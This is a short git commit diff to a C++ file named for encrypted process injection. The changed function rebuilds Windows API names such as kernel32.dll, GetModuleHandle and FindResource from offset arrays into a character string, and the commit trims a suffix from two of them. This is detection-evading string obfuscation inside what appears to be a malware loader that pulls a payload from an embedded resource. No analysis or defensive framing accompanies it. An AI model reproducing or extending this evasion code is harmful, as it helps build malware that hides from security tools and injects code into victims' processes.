7e61cd0a90eda54f542470229eba9a276a45c557
dhanush <114467712+dagowda@users.noreply.github.com>
2025-01-06 13:34:15 -0500

    Update procinj_enc.cpp

--- dummyda/procinj_enc.cpp
+++ dummyda/procinj_enc.cpp
@@ -18,8 +18,8 @@ std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  //
 void loadkumres(const char* rssssame, char** data, DWORD* size) {
     char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
     int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
-    int get_mod_han[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 33, 0, 13, 3, 11, 4, 26};
-    int fin_res[] = {31, 8, 13, 3, 43, 4, 18, 14, 20, 17, 2, 4, 26};
+    int get_mod_han[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 33, 0, 13, 3, 11, 4};
+    int fin_res[] = {31, 8, 13, 3, 43, 4, 18, 14, 20, 17, 2, 4};
     int loa_res[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
     int loc_res[] = {37, 14, 2, 10, 43, 4, 18, 14, 20, 17, 2, 4};
     int siz_res[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
